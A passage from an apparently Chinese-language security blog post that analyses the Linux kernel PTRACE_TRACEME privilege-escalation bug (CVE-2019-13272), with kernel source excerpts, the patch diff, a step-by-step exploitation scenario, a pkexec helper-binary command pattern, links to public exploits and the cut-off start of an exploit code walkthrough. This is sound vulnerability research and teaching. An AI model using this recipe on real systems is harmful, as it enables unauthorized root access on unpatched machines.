<li>行 845, 检测 euid 是否跟原有的 uid 不一致 (在函数 bprm_fill_uid 分析里我们知道，如果执行的文件是 setuid bit 的， euid 就会不一致)<pre><code>所以这里等同于检测执行的可执行程序是不是 setid 程序</code></pre></li>
<li>行 847, 检测本进程是否是 tracee </li>
</ul>
<p>如果两个条件同时满足，需要执行 ptracer_capable 函数进行权限检测，假设检测不通过， 会执行 downgrade 降权</p>
<ul>
<li>行 851, 将 new-&gt;euid 的值重新变成 new-&gt;uid， 就是说在函数 bprm_fill_uid 里提的权在这里可能又被降回去</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">499</span> <span class="function"><span class="keyword">bool</span> <span class="title">ptracer_capable</span><span class="params">(struct task_struct *tsk, struct user_namespace *ns)</span></span></span><br><span class="line"><span class="function">500 </span>&#123;</span><br><span class="line"><span class="number">501</span>         <span class="keyword">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line"><span class="number">502</span>         <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line"><span class="number">503</span>         rcu_read_lock();</span><br><span class="line"><span class="number">504</span>         cred = rcu_dereference(tsk-&gt;ptracer_cred); <span class="comment">// &lt;----- 取出 ptrace_link 时保存的 ptracer_cred </span></span><br><span class="line"><span class="number">505</span>         <span class="keyword">if</span> (cred)</span><br><span class="line"><span class="number">506</span>                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE); <span class="comment">// &lt;-------- 进入 lsm 框架进行安全检测</span></span><br><span class="line"><span class="number">507</span>         rcu_read_unlock();</span><br><span class="line"><span class="number">508</span>         <span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line"><span class="number">509</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， </p>
<ul>
<li>行 504, 取出 ‘tsk-&gt;ptracer_cred’ </li>
<li>行 506, 进入 lsm 框架对 ‘tsk-&gt;ptracer_cred’ 进行检测</li>
</ul>
<p>到了这里， 这个漏洞涉及到的变量 ‘tsk-&gt;ptracer_cred’ 终于出现了， 如前所述，这个变量是建立 trace 关系时， tracee 保存的 tracer 的 cred</p>
<p>当 tracee 随后执行 execve 去执行 suid 可执行程序时，就会调用 ptracer_capable 这个函数， 通过 lsm 里的安全框架去判断 ‘ptracer_cred’ 的权限</p>
<p>lsm 框架里的 capable hook 检测我们这里不分析了， 简单来说， 如果 tracer 本身是 root 权限， 则这里的检测会通过， 如果不是， 就会返回失败</p>
<p>根据前面的分析，如果  ptracer_capable 检测失败， new-&gt;euid 的权限会被降回去</p>
<p>举个例子， A ptrace B , B execve 执行 ‘/usr/bin/passwd’, 根据上面代码的分析， 如果 A 是 root 权限， 则 B 执行 passwd 时的 euid 是 root, 否则就还是原有的权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kernel/ptrace.c &lt;&lt;ptrace_traceme&gt;&gt;</span><br><span class="line">             ptrace_link(current, current-&gt;real_parent);  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ptrace_link</span><span class="params">(struct task_struct *child, struct task_struct *new_parent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        __ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到漏洞代码, 为什么 traceme 在建立 trace link 时记录 parent 的 cred 是不对的呢?  明明这时候 parent 就是 tracer 啊?</p>
<p>我们用 Jann Horn 举的例子来说明为什么 traceme 这种方式建立 trace link 时不能使用 tracer 的 cred</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 1, task A: fork()s a child, task B</span><br><span class="line">- 2, task B: fork()s a child, task C</span><br><span class="line">- 3, task B: execve(/some/special/suid/binary)</span><br><span class="line">- 4, task C: PTRACE_TRACEME (creates privileged ptrace relationship)</span><br><span class="line">- 5, task C: execve(/usr/bin/passwd)</span><br><span class="line">- 6, task B: drop privileges (setresuid(getuid(), getuid(), getuid()))</span><br><span class="line">- 7, task B: become dumpable again (e.g. execve(/some/other/binary))</span><br><span class="line">- 8, task A: PTRACE_ATTACH to task B</span><br><span class="line">- 9, task A: use ptrace to take control of task B</span><br><span class="line">- 10, task B: use ptrace to take control of task C</span><br></pre></td></tr></table></figure>

<p>如上场景有 3 个进程 A, B, C</p>
<ul>
<li>第 4 步， task C 使用 PTRACE_TRACE 建立跟 B 的 trace link 时， 由于 B 此时是 euid = 0 (因为它刚刚执行了 suid binary), 所以 C 记录的 ptracer_cred 的 euid 也是 0 </li>
<li>第 5 步， task C 随后执行 execve(suid binary), 根据我们上面的分析，由于 C 的 ptracer_cred 是特权的， 所以 ptracer_capable 函数检测通过，所以执行完 execve 后， task C 的 euid 也提权成 0 , 注意此时 B 和 C 的 trace link 还是有效的</li>
<li>第 6 步， task B 执行 setresuid 将自己降权， 这个降权的目的是为了能让 task A attach</li>
<li>第 8 步， task A 使用 PTRACE_ATTACH 建立跟 B 的 trace link, A 和 B 都是普通权限, 之后 A 可以控制 B 执行任何操作</li>
<li>第 9 步， task B 控制 task C 执行提权操作</li>
</ul>
<p>前面 8 步，依据之前的代码分析都是成立的，那么第 9 步能不能成立呢?</p>
<p>执行第 9 步时， task B 本身是普通权限， task C 的 euid 是 root 权限， B 和 C 的 trace link 有效, 这种条件下 B 能不能发送 ptrace request 让 C 执行各种操作，包括提权操作? </p>
<p>下面我们结合代码分析这个问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1111</span> SYSCALL_DEFINE4(ptrace, <span class="keyword">long</span>, request, <span class="keyword">long</span>, pid, <span class="keyword">unsigned</span> <span class="keyword">long</span>, addr,</span><br><span class="line"><span class="number">1112</span>                 <span class="keyword">unsigned</span> <span class="keyword">long</span>, data)</span><br><span class="line"><span class="number">1113</span> &#123;</span><br><span class="line"><span class="number">1114</span>         <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line"><span class="number">1115</span>         <span class="keyword">long</span> ret;</span><br><span class="line"><span class="number">1116</span> </span><br><span class="line"><span class="number">1117</span>         <span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line"><span class="number">1118</span>                 ret = ptrace_traceme(); <span class="comment">// &lt;----- 进入 traceme 分支</span></span><br><span class="line"><span class="number">1119</span>                 <span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="number">1120</span>                         arch_ptrace_attach(current);</span><br><span class="line"><span class="number">1121</span>                 <span class="keyword">goto</span> out;</span><br><span class="line"><span class="number">1122</span>         &#125;</span><br><span class="line"><span class="number">1123</span> </span><br><span class="line"><span class="number">1124</span>         child = find_get_task_by_vpid(pid);</span><br><span class="line"><span class="number">1125</span>         <span class="keyword">if</span> (!child) &#123;</span><br><span class="line"><span class="number">1126</span>                 ret = -ESRCH;</span><br><span class="line"><span class="number">1127</span>                 <span class="keyword">goto</span> out;</span><br><span class="line"><span class="number">1128</span>         &#125;</span><br><span class="line"><span class="number">1129</span> </span><br><span class="line"><span class="number">1130</span>         <span class="keyword">if</span> (request == PTRACE_ATTACH || request == PTRACE_SEIZE) &#123;</span><br><span class="line"><span class="number">1131</span>                 ret = ptrace_attach(child, request, addr, data); <span class="comment">// &lt;------ 进入 attach 分支</span></span><br><span class="line"><span class="number">1132</span>                 <span class="comment">/*</span></span><br><span class="line"><span class="comment">1133                  * Some architectures need to do book-keeping after</span></span><br><span class="line"><span class="comment">1134                  * a ptrace attach.</span></span><br><span class="line"><span class="comment">1135                  */</span></span><br><span class="line"><span class="number">1136</span>                 <span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="number">1137</span>                         arch_ptrace_attach(child);</span><br><span class="line"><span class="number">1138</span>                 <span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line"><span class="number">1139</span>         &#125;</span><br><span class="line"><span class="number">1140</span> </span><br><span class="line"><span class="number">1141</span>         ret = ptrace_check_attach(child, request == PTRACE_KILL ||</span><br><span class="line"><span class="number">1142</span>                                   request == PTRACE_INTERRUPT);</span><br><span class="line"><span class="number">1143</span>         <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">1144</span>                 <span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line"><span class="number">1145</span> </span><br><span class="line"><span class="number">1146</span>         ret = arch_ptrace(child, request, addr, data); <span class="comment">// &lt;---- 其他 ptrace request </span></span><br><span class="line"><span class="number">1147</span>         <span class="keyword">if</span> (ret || request != PTRACE_DETACH)</span><br><span class="line"><span class="number">1148</span>                 ptrace_unfreeze_traced(child);</span><br><span class="line"><span class="number">1149</span> </span><br><span class="line"><span class="number">1150</span>  out_put_task_struct:</span><br><span class="line"><span class="number">1151</span>         put_task_struct(child);</span><br><span class="line"><span class="number">1152</span>  out:</span><br><span class="line"><span class="number">1153</span>         <span class="keyword">return</span> ret;</span><br><span class="line"><span class="number">1154</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， 由于 task B 和 task C 此时已经存在 trace link， 所以通过 B 向 C 可以直接发送 ptrace request， 将进入函数 arch_ptrace</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/kernel/ptrace.c</span><br><span class="line"></span><br><span class="line">arch_ptrace </span><br><span class="line">	-&gt; ptrace_request </span><br><span class="line">		-&gt; generic_ptrace_peekdata</span><br><span class="line">		   generic_ptrace_pokedata </span><br><span class="line">			-&gt; ptrace_access_vm </span><br><span class="line">				-&gt; ptracer_capable </span><br><span class="line"></span><br><span class="line"> kernel/ptrace.c</span><br><span class="line"> <span class="number">884</span> <span class="function"><span class="keyword">int</span> <span class="title">ptrace_request</span><span class="params">(struct task_struct *child, <span class="keyword">long</span> request,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">885</span>                    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"> 886 </span>&#123;</span><br><span class="line"> <span class="number">887</span>         <span class="keyword">bool</span> seized = child-&gt;ptrace &amp; PT_SEIZED;</span><br><span class="line"> <span class="number">888</span>         <span class="keyword">int</span> ret = -EIO;</span><br><span class="line"> <span class="number">889</span>         <span class="keyword">siginfo_t</span> siginfo, *si;</span><br><span class="line"> <span class="number">890</span>         <span class="keyword">void</span> __user *datavp = (<span class="keyword">void</span> __user *) data;</span><br><span class="line"> <span class="number">891</span>         <span class="keyword">unsigned</span> <span class="keyword">long</span> __user *datalp = datavp;</span><br><span class="line"> <span class="number">892</span>         <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"> <span class="number">893</span> </span><br><span class="line"> <span class="number">894</span>         <span class="keyword">switch</span> (request) &#123;</span><br><span class="line"> <span class="number">895</span>         <span class="keyword">case</span> PTRACE_PEEKTEXT:</span><br><span class="line"> <span class="number">896</span>         <span class="keyword">case</span> PTRACE_PEEKDATA:</span><br><span class="line"> <span class="number">897</span>                 <span class="keyword">return</span> generic_ptrace_peekdata(child, addr, data);</span><br><span class="line"> <span class="number">898</span>         <span class="keyword">case</span> PTRACE_POKETEXT:</span><br><span class="line"> <span class="number">899</span>         <span class="keyword">case</span> PTRACE_POKEDATA:</span><br><span class="line"> <span class="number">900</span>                 <span class="keyword">return</span> generic_ptrace_pokedata(child, addr, data);</span><br><span class="line"> <span class="number">901</span> </span><br><span class="line"> =================== skip ================</span><br><span class="line"> <span class="number">1105</span> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="number">1156</span> <span class="keyword">int</span> generic_ptrace_peekdata(struct task_struct *tsk, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span><br><span class="line"> <span class="number">1157</span>                             <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span><br><span class="line"> <span class="number">1158</span> &#123;</span><br><span class="line"> <span class="number">1159</span>         <span class="keyword">unsigned</span> <span class="keyword">long</span> tmp;</span><br><span class="line"> <span class="number">1160</span>         <span class="keyword">int</span> copied;</span><br><span class="line"> <span class="number">1161</span> </span><br><span class="line"> <span class="number">1162</span>         copied = ptrace_access_vm(tsk, addr, &amp;tmp, <span class="keyword">sizeof</span>(tmp), FOLL_FORCE); <span class="comment">// &lt;--- 调用 ptrace_access_vm</span></span><br><span class="line"> <span class="number">1163</span>         <span class="keyword">if</span> (copied != <span class="keyword">sizeof</span>(tmp))</span><br><span class="line"> <span class="number">1164</span>                 <span class="keyword">return</span> -EIO;</span><br><span class="line"> <span class="number">1165</span>         <span class="keyword">return</span> put_user(tmp, (<span class="keyword">unsigned</span> <span class="keyword">long</span> __user *)data);</span><br><span class="line"> <span class="number">1166</span> &#125;</span><br><span class="line"> <span class="number">1167</span> </span><br><span class="line"> <span class="number">1168</span> <span class="function"><span class="keyword">int</span> <span class="title">generic_ptrace_pokedata</span><span class="params">(struct task_struct *tsk, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">1169</span>                             <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"> 1170 </span>&#123;</span><br><span class="line"> <span class="number">1171</span>         <span class="keyword">int</span> copied;</span><br><span class="line"> <span class="number">1172</span> </span><br><span class="line"> <span class="number">1173</span>         copied = ptrace_access_vm(tsk, addr, &amp;data, <span class="keyword">sizeof</span>(data), <span class="comment">// &lt;---- 调用 ptrace_access_vm</span></span><br><span class="line"> <span class="number">1174</span>                         FOLL_FORCE | FOLL_WRITE);</span><br><span class="line"> <span class="number">1175</span>         <span class="keyword">return</span> (copied == <span class="keyword">sizeof</span>(data)) ? <span class="number">0</span> : -EIO;</span><br><span class="line"> <span class="number">1176</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上，当 tracer 想要控制 tracee 执行新的代码逻辑时，需要发送 request 读写 tracee 的代码区和内存区， 对应的 request 是 PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA </p>
<p>这几种读写操作最终都是通过函数 ptrace_access_vm 实现的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">kernel/ptrace.c</span><br><span class="line"><span class="number">38</span> <span class="function"><span class="keyword">int</span> <span class="title">ptrace_access_vm</span><span class="params">(struct task_struct *tsk, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">39</span>                      <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags)</span></span></span><br><span class="line"><span class="function">40 </span>&#123;</span><br><span class="line"><span class="number">41</span>         <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="number">42</span>         <span class="keyword">int</span> ret;</span><br><span class="line"><span class="number">43</span> </span><br><span class="line"><span class="number">44</span>         mm = get_task_mm(tsk);</span><br><span class="line"><span class="number">45</span>         <span class="keyword">if</span> (!mm)</span><br><span class="line"><span class="number">46</span>                 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">47</span> </span><br><span class="line"><span class="number">48</span>         <span class="keyword">if</span> (!tsk-&gt;ptrace ||</span><br><span class="line"><span class="number">49</span>             (current != tsk-&gt;parent) ||</span><br><span class="line"><span class="number">50</span>             ((get_dumpable(mm) != SUID_DUMP_USER) &amp;&amp;</span><br><span class="line"><span class="number">51</span>              !ptracer_capable(tsk, mm-&gt;user_ns))) &#123; <span class="comment">// &lt; ----- 又是调用 ptracer_capable 函数</span></span><br><span class="line"><span class="number">52</span>                 mmput(mm);</span><br><span class="line"><span class="number">53</span>                 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">54</span>         &#125;</span><br><span class="line"><span class="number">55</span> </span><br><span class="line"><span class="number">56</span>         ret = __access_remote_vm(tsk, mm, addr, buf, len, gup_flags);</span><br><span class="line"><span class="number">57</span>         mmput(mm);</span><br><span class="line"><span class="number">58</span> </span><br><span class="line"><span class="number">59</span>         <span class="keyword">return</span> ret;</span><br><span class="line"><span class="number">60</span> &#125;</span><br><span class="line"></span><br><span class="line">kernel/capability.c</span><br><span class="line"><span class="number">499</span> <span class="function"><span class="keyword">bool</span> <span class="title">ptracer_capable</span><span class="params">(struct task_struct *tsk, struct user_namespace *ns)</span></span></span><br><span class="line"><span class="function">500 </span>&#123;</span><br><span class="line"><span class="number">501</span>         <span class="keyword">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line"><span class="number">502</span>         <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line"><span class="number">503</span>         rcu_read_lock();</span><br><span class="line"><span class="number">504</span>         cred = rcu_dereference(tsk-&gt;ptracer_cred);</span><br><span class="line"><span class="number">505</span>         <span class="keyword">if</span> (cred)</span><br><span class="line"><span class="number">506</span>                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);</span><br><span class="line"><span class="number">507</span>         rcu_read_unlock();</span><br><span class="line"><span class="number">508</span>         <span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line"><span class="number">509</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， ptrace_access_vm 函数会调用我们之前分析到的 ‘ptracer_capable’ 来决定这个 request 是否可以进行, 这是 ‘ptracer_capable’ 函数的第二种使用场景</p>
<p>根据之前我们分析的结果， task C 此时保存的 ptracer_cred 是特权 cred, 所以这时候 ptracer_capable 会通过， 也就是说我们回答了刚刚的问题， 这种情况下，普通权限的 task B 是可以发送 ptrace request 去读写 root 权限的 task C 的内存区和代码区的</p>
<p>至此，task C 记录的这个特权 ptracer_cred 实际上发挥了 2 种作用</p>
<ul>
<li>1，可以让 task C 执行 execve(suid binary) 给自己提权</li>
<li>2，可以让普通权限的 task B 执行 ptrace 读写 task C 的代码区和内存区，从而控制 task C 执行任意操作</li>
</ul>
<p>上面 2 点合起来，不就是完整的提权操作吗?</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我们仔细回顾上述代码分析过程， 才终于明白补丁描述写的这段话</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_TRACEME records the parent<span class="string">'s credentials as if the parent was </span></span><br><span class="line"><span class="string">acting as the subject, but that'</span>s not the <span class="keyword">case</span>.  If a malicious</span><br><span class="line">unprivileged child uses PTRACE_TRACEME and the parent is privileged, and</span><br><span class="line">at a later point, the parent process becomes attacker-controlled</span><br><span class="line">(because it drops privileges and calls execve()), the attacker ends up</span><br><span class="line">with control over two processes with a privileged ptrace relationship,</span><br><span class="line"><span class="built_in">which</span> can be abused to ptrace a suid binary and obtain root privileges.</span><br></pre></td></tr></table></figure>

<p>本质上这个漏洞有点像 <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use" target="_blank" rel="noopener">TOCTOU</a> 类漏洞, ptracer_cred 的获取是在 traceme 阶段,  而 ptracer_cred 的应用是在随后的各种 request 阶段， 而在随后的 ptrace request 的时候， tracer 的 cred 可能已经不是一开始建立 trace link 时的那个 cred 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span><br><span class="line">index <span class="number">8456b</span>6e.<span class="number">.705887</span>f <span class="number">100644</span></span><br><span class="line">--- a/kernel/ptrace.c</span><br><span class="line">+++ b/kernel/ptrace.c</span><br><span class="line">@@ <span class="number">-79</span>,<span class="number">9</span> +<span class="number">79</span>,<span class="number">7</span> @@ <span class="keyword">void</span> __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">  */</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">void</span> ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line">-	rcu_read_lock();</span><br><span class="line">-	__ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">-	rcu_read_unlock();</span><br><span class="line">+	__ptrace_link(child, new_parent, current_cred());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>我们再次看看 jann horn 的补丁:   ‘__task_cred(new_parent)’ -&gt; ‘current_cred()’  </p>
<p>补丁的意思是说在 PTRACE_TRACEME 这种场景下， ptracer_cred 记录的不应该是父进程的 cred， 而应该是自己的 cred</p>
<p>所以我觉得从这个变量的用途来说，它其实记录的不是 tracer 的 cred, 而是 ‘trace link creater’ 的 cred</p>
<p>我建议 jann horn 将这个变量名改成 ptracelinkcreater_cred, 当 trace link 由 PTRACE_ATTACH 建立时， 它等于 tracer 的 cred, 当 trace link 由 PTRACE_TRACEME 建立时， 它等于 tracee 的 cred, 它实际上记录的是 trace 关系建立者的权限 !</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>本漏洞利用的关键是找到合适的可执行程序启动 task B, 这个可执行程序要满足如下条件:</p>
<ul>
<li>1, 必须是能被普通权限用户调用</li>
<li>2, 执行时必须有提权到root的阶段</li>
<li>3, 执行提权后必须执行降权</li>
</ul>
<p>(短暂提权到 root 的目的是让 task C 可以获取 root 的 ptracer_cred, 再降权的目的是让 B 能被普通权限的进程 ptrace attach)</p>
<p>这里我列出 3 份 exploit 代码:</p>
<ul>
<li>1 <a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217" target="_blank" rel="noopener">jann horn 的 exploit</a> </li>
<li>2 <a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c" target="_blank" rel="noopener">bcoles 的 exploit</a> </li>
<li>3 <a href="https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272" target="_blank" rel="noopener">jiayy 的 exploit</a></li>
</ul>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217" target="_blank" rel="noopener">jann horn 的 exploit</a> 里使用桌面发行版自带的 <a href="http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html" target="_blank" rel="noopener">pkexec</a> 程序用于启动 task B</p>
<p><a href="http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html" target="_blank" rel="noopener">pkexec</a> 允许特权用户以其他用户权限执行另外一个可执行程序， 用于 <a href="https://wiki.archlinux.org/index.php/Polkit" target="_blank" rel="noopener">polkit</a> 认证框架, 当使用 –user 参数时， 刚好可以让进程先提权到  root 然后再降权到指定用户，因此可以用于构建进程 B, 此外需要找到通过 polkit 框架执行的可执行程序(jann horn 把他们成为 helper)， 这些 helper 程序需要满足普通用户用 pkexec 执行它们时不需要认证（很多通过 polkit 执行的程序都需要弹窗认证）, 执行的模式如下:</p>
<ul>
<li>/usr/bin/pkexec –user nonrootuser /user/sbin/some-helper-binary</li>
</ul>
<p><a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c" target="_blank" rel="noopener">bcoles 的 exploit</a> 在 jann horn 的基础上增加了寻找更多 helper binary 的代码， 因为 jann horn 的 helper 是一个写死的程序， 在很多发行版并不存在，所以他的 exploit 在很多发行版系统上无法运行， bcoles 的 exploit 可以在更多的发行版上运行成功</p>
<p>本人出于学习的目的，也写了一份 <a href="https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272" target="_blank" rel="noopener">jiayy 的 exploit</a>, 因为 helper binary 因不同发行版而异， pkexec 也是桌面发行版才有， 而事实上这个提权漏洞是 linux kernel 的漏洞， 所以我把 jann horn 的 exploit 改成了使用一个 fakepkexec 程序来提权， 而这个 fakepkexec 和 fakehelper 程序手动生成（而不是从目标系统搜索），这样一来学习者可以在任何存在本漏洞的 linux 系统（不需要桌面）运行我的 exploit 进行研究</p>
<h2 id="exploit-分析"><a href="#exploit-分析" class="headerlink" title="exploit 分析"></a>exploit 分析</h2><p>下面简单过一下 exploit 的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">167</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="number">168</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage2"</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">169</span>     <span class="keyword">return</span> middle_stage2();</span><br><span class="line"><span class="number">170</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage3"</span>) == <span 